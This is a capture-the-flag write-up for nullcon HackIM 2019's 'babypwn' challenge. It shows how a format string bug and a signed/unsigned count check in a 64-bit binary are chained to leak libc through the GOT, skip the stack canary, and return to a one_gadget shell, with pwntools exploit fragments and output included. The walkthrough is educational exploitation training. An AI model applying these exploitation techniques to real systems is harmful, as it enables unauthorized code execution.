# BabyPWN

##Background
Kernel Sanders, my CTF team, took part in nullcom HackIM 2019 last weekend, and there were many interesting challenges. I looked at 2 main ones, and while I made progress on both I was not able to solve either during the time span. I partially blame this on the fact that I went to BSides Tampa on Saturday and only had one night to work, but Nozomi and Ryan both got solves for our team this weekend. Babypwn was a great challenge, and I learned a lot by working on it. I will link the writeups that helped me with certain parts at the bottom, but I will show my mindset and pitfalls with this challenge as well.

## First Thoughts
When I first got this binary, I determined that it was a 64 bit ELF file. 

```
➜  babypwn checksec challenge  
[*] '/home/vagrant/pwning/hackim/babypwn/challenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This told me a few important pieces of information that would help me create my exploit. The 64 bit architecture meant that I may need to use registers while attempting to call functions, but it also meant that whatever libc this file used would have a one-gadget inside. Full RELRO meant that overwriting the global offset table would not work, and a stack canary would hinder any buffer overflow unless I could leak it. NX is enabled, so I will have to use ROP rather than creating shellcode. Most importantly, or at least the main positive here, is that there is no PIE. This means that I can use addresses inside of this binary without any leak.

At this point I decided to run the binary and see if there were any obvious bugs. Usually in my first few runs I test obvious edge cases to see if anything stands out before I start more in depth reverse engineering.

```
➜  babypwn ./challenge
Create a tressure box?
y
name: noopnoop
How many coins do you have?
100
Coins that many are not supported :/
: Success
➜  babypwn ./challenge
Create a tressure box?
Y
name: %x.%x.%x.%x.%x.%x.%x
How many coins do you have?
10
1 2 3 4 5 6 7 8 9 10
Tressure Box: 1.72259790.10.0.0.1.193f010 created!
```

Awesome! I was able to find a format string vulnerability already, so I can most likely write and read certain variables. In order to understand what is on the stack and how the binary functions, it is time to fire up Ida!

## Static Analysis
The bulk of the code was inside of the main function, and the program seemed relatively simple. After specifying a name, you choose how many coins you would like to input. Each coin is input on the stack as an element of an array. There should be no problem here because the max number of coins is 20 and the array size is 20*4 = 80 bytes long. 

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char *fmt_ptr; // rax
  char *v5; // rax
  char *v6; // rsi
  unsigned __int8 coin_count; // [rsp+6h] [rbp-6Ah]
  unsigned __int8 i; // [rsp+7h] [rbp-69h]
  char *format; // [rsp+8h] [rbp-68h]
  char coin_array[80]; // [rsp+10h] [rbp-60h]
  char yes_scan; // [rsp+60h] [rbp-10h]
  unsigned __int64 cookie; // [rsp+68h] [rbp-8h]

  cookie = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(_bss_start, 0LL);
  coin_count = 0;
  puts("Create a tressure box?\r");
  _isoc99_scanf("%2s", &yes_scan);
  if ( yes_scan == 121 || yes_scan == 89 )
  {
    printf("name: ", &yes_scan);
    fmt_ptr = (char *)malloc(0x64uLL);
    format = fmt_ptr;
    *(_QWORD *)fmt_ptr = 'erusserT';
    *((_DWORD *)fmt_ptr + 2) = 'xoB ';
    *((_WORD *)fmt_ptr + 6) = ' :';
    fmt_ptr[14] = 0;
    _isoc99_scanf("%50s", format + 14);
    v5 = &format[strlen(format)];
    *(_QWORD *)v5 = 'detaerc ';
    *((_DWORD *)v5 + 2) = '\n\r!';
    puts("How many coins do you have?\r");
    v6 = (char *)&coin_count;
    _isoc99_scanf("%hhu", &coin_count);
    if ( (char)coin_count > 20 )
    {
      perror("Coins that many are not supported :/\r\n");
      exit(1);
    }
    for ( i = 0; i < coin_count; ++i )
    {
      v6 = &coin_array[4 * i];
      _isoc99_scanf("%d", v6);
    }
    printf(format, v6);
    free(format);
    result = 0;
  }
  else
  {
    puts("Bye!\r");
    result = 0;
  }
  return result;
}
```
The format string is stored in the heap after the allocation 'malloc(0x64)', so there may be some issues in exploiting the format string vulnerability. Also, the cookie is shown again to be on the stack, so this could be an issue while trying to exploit the format string.

At this point I tried a few random format strings to see what information I could leak from the stack and what sort of path I could take to leak information and jump back into the main method, but this did not lead anywhere. I took a break to work on the other challenge that I looked at this weekend (GCM). Later that night, when my teammate Kolby was leaving, I asked if he had any luck with the format string and he pointed out that he was looking into another bug instead. He pointed out that inputting a large number let you use more than 20 coins, and he was able to get a stack smashing detected error. This signed vs unsigned comparison was huge, so I looked further into this. 

```
gef➤  telescope $rsp 20
0x00007fffffffe380│+0x00: 0xffff000000000001     ← $rsp
0x00007fffffffe388│+0x08: 0x0000000000602010  →  "Tressure Box: noopnoop created!"
0x00007fffffffe390│+0x10: 0x0000000200000001
0x00007fffffffe398│+0x18: 0x0000000400000003
0x00007fffffffe3a0│+0x20: 0x0000000600000005
0x00007fffffffe3a8│+0x28: 0x0000000800000007
0x00007fffffffe3b0│+0x30: 0x0000000200000001
0x00007fffffffe3b8│+0x38: 0x0000000400000003
0x00007fffffffe3c0│+0x40: 0x0000000600000005
0x00007fffffffe3c8│+0x48: 0x0000000800000007
0x00007fffffffe3d0│+0x50: 0x0000000200000001
0x00007fffffffe3d8│+0x58: 0x0000000400000003
0x00007fffffffe3e0│+0x60: 0x0000000600000005
0x00007fffffffe3e8│+0x68: 0x0000000800000007
0x00007fffffffe3f0│+0x70: 0x0000000200000001     ← $rbp
0x00007fffffffe3f8│+0x78: 0x0000000400000003
0x00007fffffffe400│+0x80: 0x0000000600000005
0x00007fffffffe408│+0x88: 0x0000000800000007
0x00007fffffffe410│+0x90: 0x00000001f7ffcca0
0x00007fffffffe418│+0x98: 0x0000000000400806  →  <main+0> push rbp
```

I was able to fill the stack beyond where I should have been allowed to, overwriting the return address and many variables on the way. However, stepping further in gdb showed how I could have a problem on my hands...

```
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x800000007
$rdx   : 0x0
$rsp   : 0x7fffffffe380      →  0xffff000000000001
$rbp   : 0x7fffffffe3f0      →  0x0000000200000001
$rsi   : 0x7ffff7dd1b50      →  0x0000000000602000  →  0x0000000000000000
$rdi   : 0xffffffff
$rip   : 0x4009c2            →  0x000028250c334864 ("dH3
                                                        %("?)
$r8    : 0x602010            →  0x0000000000000000
$r9    : 0x0
$r10   : 0xd21646574616572  ("reated!\r"?)
$r11   : 0x246
$r12   : 0x400710            →  <_start+0> xor ebp, ebp
$r13   : 0x7fffffffe4d0      →  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [carry parity adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]
$ds: 0x0000  $fs: 0x0000  $cs: 0x0033  $ss: 0x002b  $gs: 0x0000  $es: 0x0000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
0x00007fffffffe380│+0x00: 0xffff000000000001     ← $rsp
0x00007fffffffe388│+0x08: 0x0000000000602010  →  0x0000000000000000
0x00007fffffffe390│+0x10: 0x0000000200000001
0x00007fffffffe398│+0x18: 0x0000000400000003
0x00007fffffffe3a0│+0x20: 0x0000000600000005
0x00007fffffffe3a8│+0x28: 0x0000000800000007
0x00007fffffffe3b0│+0x30: 0x0000000200000001
0x00007fffffffe3b8│+0x38: 0x0000000400000003
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386:x86-64 ]────
     0x4009b4 <main+430>       call   0x4006b0
     0x4009b9 <main+435>       mov    eax, 0x0
     0x4009be <main+440>       mov    rcx, QWORD PTR [rbp-0x8]
 →   0x4009c2 <main+444>       xor    rcx, QWORD PTR fs:0x28
     0x4009cb <main+453>       je     0x4009d2 <main+460>
     0x4009cd <main+455>       call   0x4006c0
     0x4009d2 <main+460>       leave
     0x4009d3 <main+461>       ret
     0x4009d4                  nop    WORD PTR cs:[rax+rax*1+0x0]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]────
[#0] Id 1, Name: "challenge", stopped, reason: SINGLE STEP
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x4009c2 → Name: main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Rather than holding the random stack cookie that was loaded in the beginning of the program, register rcx held 0x800000007, the 7 and 8 that I input as coins. At this point I knew that I could leak the stack cookie with my format string exploit, but then the program would terminate. The only way to stop the program from terminating was to use my input coins to overwrite my return address, but this was further down the stack than the cookie was. 

### Libc and the Global Offset Table

The other problem that I noticed early on wasn't as much of a problem as an inconvenience. I was never provided with a libc, so I was not sure of the offsets that would work on the server once I started developing my exploit. This is not too much of a problem because I can leak a few different values using the global offset table, and then I could search these with a libc database like <https://libc.blukat.me/>. My plan was to use global offset table addresses as coins, and then I would use my format string vulnerability to leak the libc values stored in the global offset table. 

```
gef➤  x/20gx 0x0000000000600FA8
0x600fa8:       0x00007ffff7a914f0      0x00007ffff7a7c690
0x600fb8:       0x00007ffff7b260f0      0x00007ffff7a836b0
0x600fc8:       0x00007ffff7a62800      0x00007ffff7a2d740
0x600fd8:       0x0000000000000000      0x00007ffff7a91130
0x600fe8:       0x00007ffff7a77990      0x00007ffff7a784d0
0x600ff8:       0x00007ffff7a47030      0x0000000000000000
0x601008:       0x0000000000000000      0x00007ffff7dd2620
0x601018:       0x0000000000000000      0x00007ffff7dd18e0
0x601028 <completed.7594>:      0x0000000000000000      0x0000000000000000
0x601038:       0x0000000000000000      0x0000000000000000
gef➤  x/i 0x00007ffff7a914f0
   0x7ffff7a914f0 <__GI___libc_free>:   push   r13
gef➤  x/i 0x00007ffff7a7c690
   0x7ffff7a7c690 <_IO_puts>:   push   r12
gef➤  x/i 0x00007ffff7b260f0
   0x7ffff7b260f0 <__stack_chk_fail>:   lea    rdi,[rip+0x7638a]        # 0x7ffff7b9c481
gef➤  x/i 0x00007ffff7a836b0
   0x7ffff7a836b0 <setbuf>:     mov    edx,0x2000
gef➤
```

As can be seen, each of these offsets in the GOT hold libc addresses of certain functions. If I can leak these addresses from the server, I should be able to discover which version of libc they are using and then find the one-gadget from that. Also, I am able to use these offsets to leak libc addresses because the binary is loaded to a set address in memory (thank god for no PIE).

## Game Plan

At this point I had a plan of attack:

* Use the coins as addresses in the global offset table and use the format string to leak to libc values.
* Overwrite the return address with the address of main to jump back to the beginning and allow further input.
* Use the appropriate libc to find a one-gadget and overwrite the return address with this value.
* Return to a shell and get the flag!

My problem was the cookie. Even if I leak it with the format string it would be too late. 

## The Missing Link

After the CTF ended the following night I found out something interesting. 

```
gef➤  r
Starting program: /home/vagrant/pwning/hackim/babypwn/challenge
Create a tressure box?
y
name: noop
How many coins do you have?
255
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 - - 25 26
q
```


```
gef➤  telescope $rsp 20
0x00007fffffffe380│+0x00: 0xffff000000000001     ← $rsp
0x00007fffffffe388│+0x08: 0x0000000000602010  →  "Tressure Box: noop created!"
0x00007fffffffe390│+0x10: 0x0000000200000001
0x00007fffffffe398│+0x18: 0x0000000400000003
0x00007fffffffe3a0│+0x20: 0x0000000600000005
0x00007fffffffe3a8│+0x28: 0x0000000800000007
0x00007fffffffe3b0│+0x30: 0x0000000a00000009
0x00007fffffffe3b8│+0x38: 0x0000000c0000000b
0x00007fffffffe3c0│+0x40: 0x0000000e0000000d
0x00007fffffffe3c8│+0x48: 0x000000100000000f
0x00007fffffffe3d0│+0x50: 0x0000001200000011
0x00007fffffffe3d8│+0x58: 0x0000001400000013
0x00007fffffffe3e0│+0x60: 0x0000001600000015
0x00007fffffffe3e8│+0x68: 0x2e3e5db4f6470000
0x00007fffffffe3f0│+0x70: 0x0000001a00000019     ← $rbp
0x00007fffffffe3f8│+0x78: 0x00007ffff7a2d830  →  <__libc_start_main+240> mov edi, eax
0x00007fffffffe400│+0x80: 0x0000000000000001
0x00007fffffffe408│+0x88: 0x00007fffffffe4d8  →  0x00007fffffffe729  →  "/home/vagrant/pwning/hackim/babypwn/challenge"
0x00007fffffffe410│+0x90: 0x00000001f7ffcca0
0x00007fffffffe418│+0x98: 0x0000000000400806  →  <main+0> push rbp
```

As can be seen at 0x00007fffffffe3e8, the stack canary is still untouched, and there is a break between 0x16 and 0x19. Apparently, scanf("%d") ignores a "-" but does not cause the program to terminate or throw any errors. With this knowledge, we can put the exploit plan into action!

## The Execution

By running with a name of "%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x", I am able to determine the offset in the stack of my coins.

```
Tressure Box: 0.f7dd3790.71.0.f7fe0700.1.602010.1.3.5.7.9.b.d created!
```

In this return, we can see that the values of the coins that I input, "1 2 3 4 5 6 7 ...." start to appear at the 8th value on the stack. This show's me two things.

* I can put global offset table addresses as the coins and leak the libc addresses that correspond by using %8$s..%9$s..%10$s".
* Every other coin is displayed by this format string, reminding me that the coins are input as 32 bit integers while the stack uses 64 bit alignment. This means that I may have to input the global offset table values as two 32 bit segments.

```
gef➤  telescope $rsp 20
0x00007fffffffe380│+0x00: 0xffff000000000001     ← $rsp
0x00007fffffffe388│+0x08: 0x0000000000602010  →  "Tressure Box: ans created!"
0x00007fffffffe390│+0x10: 0x0000000200000001
0x00007fffffffe398│+0x18: 0x0000000400000003
0x00007fffffffe3a0│+0x20: 0x0000000600000005
0x00007fffffffe3a8│+0x28: 0x0000000800000007
0x00007fffffffe3b0│+0x30: 0x0000000a00000009
0x00007fffffffe3b8│+0x38: 0x0000000000400a2d  →  <__libc_csu_init+77> add rbx, 0x1
0x00007fffffffe3c0│+0x40: 0x00007fffffffe3ee  →  0x0000004009e08476
0x00007fffffffe3c8│+0x48: 0x0000000000000000
0x00007fffffffe3d0│+0x50: 0x00000000004009e0  →  <__libc_csu_init+0> push r15
0x00007fffffffe3d8│+0x58: 0x0000000000400710  →  <_start+0> xor ebp, ebp
0x00007fffffffe3e0│+0x60: 0x00007fffffff0079  →  0x0000000000000000
0x00007fffffffe3e8│+0x68: 0x847650e3e6aefe00
0x00007fffffffe3f0│+0x70: 0x00000000004009e0  →  <__libc_csu_init+0> push r15    ← $rbp
0x00007fffffffe3f8│+0x78: 0x00007ffff7a2d830  →  <__libc_start_main+240> mov edi, eax
0x00007fffffffe400│+0x80: 0x0000000000000001
0x00007fffffffe408│+0x88: 0x00007fffffffe4d8  →  0x00007fffffffe72a  →  "/home/vagrant/pwning/hackim/babypwn/challenge"
0x00007fffffffe410│+0x90: 0x00000001f7ffcca0
0x00007fffffffe418│+0x98: 0x0000000000400806  →  <main+0> push rbp
```

By looking at the stack, I can tell that I will input 22 coins before reaching the cookie. After the cookie, there is another 64 bit value for libc_csu_init which I can overwrite with anything before reaching libc_start_main. Here, at 0x00007fffffffe3f8, I will put the pointer to the main function and start again.

```
free_got = 0x600FA8
puts_got = 0x600FB0
setbuf_got = 0x600FC0
printf_got = 0x600FC8
main = 0x400806

target.sendline(str(free_got))
target.sendline(str(0))
target.sendline(str(puts_got))
target.sendline(str(0))
target.sendline(str(setbuf_got))
target.sendline(str(0))
target.sendline(str(printf_got))
target.sendline(str(0))

for i in range(14):
    target.sendline("1")
    target.sendline("2")

target.sendline("-")
target.sendline("-")  #bypass scanf, skip cookie

target.sendline("0") #libc_csu_init on stack, not important now
target.sendline("0")

target.sendline(str(main)) #return address, jump back to main
target.sendline(str(0))

target.interactive()
```

Running this gives me the following:

```
Tressure Box: x86\x7f..\x90v..\xb0x86\x7f.. created!
*** stack smashing detected ***: ./challenge terminated
```

I got the leaks! However, I also got a stack smashing detected message. I set a breakpoint at 0x00000000004009C2 and checked the value at $rcx here.

```
gef➤  p/x $rcx
$1 = 0x200000001
```

Ah, I wrote too many coins! I noticed that I looped through coins 1 and 2 14 times to fill the 14 slots, but I should only loop 7 times because I write two coins each time! Doing this allows me to start main again! First I must unpack the libc values (I get 6 bytes, the top 2 bytes are null), and then display this to myself.

```
target.recvuntil("Tressure Box: ")
free = u64(target.recv(6) + "\x00\x00")
target.recv(2)
puts = u64(target.recv(6) + "\x00\x00")
target.recv(2)
setbuf = u64(target.recv(6) + "\x00\x00")
target.recv(2)
printf = u64(target.recv(6) + "\x00\x00")

log.info("Free: " + hex(free))
log.info("Puts: " + hex(puts))
log.info("Setbuf: " + hex(setbuf))
log.info("Printf: " + hex(printf))
```

Running this gives me the following: 

```
➜  babypwn python exp.py
[+] Starting local process './challenge': pid 8191

[*] Free: 0x7f1375e244f0
[*] Puts: 0x7f1375e0f690
[*] Setbuf: 0x7f1375e166b0
[*] Printf: 0x746165726320
[*] Switching to interactive mode
ed!
Create a tressure box?
```
The value of printf is very far from the others, showing that this hasn't been linked yet. We can search for the other 3 values in the database to see that the binary uses libc6_2.23-0ubuntu10_amd64.so.

Let's get this binary and run one_gadget on it.

```
➜  babypwn one_gadget libc.so.6
[OneGadget] Checking for new versions of OneGadget
            To disable this functionality, do
            $ echo never > /home/vagrant/.cache/one_gadget/update

[OneGadget] A newer version of OneGadget is available (1.6.0 --> 1.6.2).
            Update with: $ gem update one_gadget

0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
➜  babypwn
```

One_gadget shows me a few locations that could give me a shell, but I will use the second option, 0x4526a. I usually do not choose options that require a register to be NULL because this seems less reliable. 

Now that I can give input again, I will do the same as before to send extra coins, ignore the stack cookie, and overwrite the return address. However, in this case the return address will take two writes because the libc value is over 4 bytes large. To do this, I will write one_gadget & 0xffffffff first, then one_gadget >> 32. This wil give me the lower 4 bytes in the first coin slot and the upper 4 bytes in the next coin slow. Let's see if this works!

```
➜  babypwn python exp.py
[+] Starting local process './challenge': pid 8467

[*] Free: 0x7fe46b7264f0
[*] Puts: 0x7fe46b711690
[*] Setbuf: 0x7fe46b7186b0
[*] Printf: 0x746165726320
[*] Switching to interactive mode

Tressure Box: noopnoop created!
$ ls
challenge  core  exp.py  flag.txt  libc.so.6
$ cat flag.txt
FLAG{w0rk5_l0c4l1y!}
$
```

Awesome! This challenge was a great learning experience, even if I did not finish it during the CTF. A huge thanks to Kolby for noticing the unsigned vs signed bug, and a thanks to <https://devel0pment.de/?p=1191> for helping me identify the libc version after the service was taken offline.

If this all seemed too difficult, here are a few lower level resources to help explain format string vulnerabilites and the global offset table:

* On format string vulnerabilities: <http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf>
* On the Global Offset Table: <https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html>